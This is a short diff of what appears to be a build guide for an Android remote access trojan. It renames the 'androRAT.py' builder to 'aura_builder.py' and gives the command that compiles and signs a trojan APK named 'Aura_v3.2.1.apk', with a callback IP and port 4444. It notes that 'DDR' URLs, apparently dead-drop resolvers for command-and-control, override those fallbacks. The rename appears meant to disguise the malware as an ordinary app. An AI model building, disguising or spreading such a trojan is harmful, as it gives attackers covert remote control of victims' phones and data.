@@ -73,9 +73,9 @@ private static final String[] DDR_URLS = {
 ```
 
 ### 3.2 Build the APK
-Use the `androRAT.py` builder script to compile and sign the APK:
+Use the `aura_builder.py` builder script to compile and sign the APK:
 ```bash
-python3 androRAT.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.2.1.apk --icon
+python3 aura_builder.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.2.1.apk --icon
 ```
 *(Note: Since we use DDR, the IP/Port passed to the builder are used only as fallbacks)*.
 
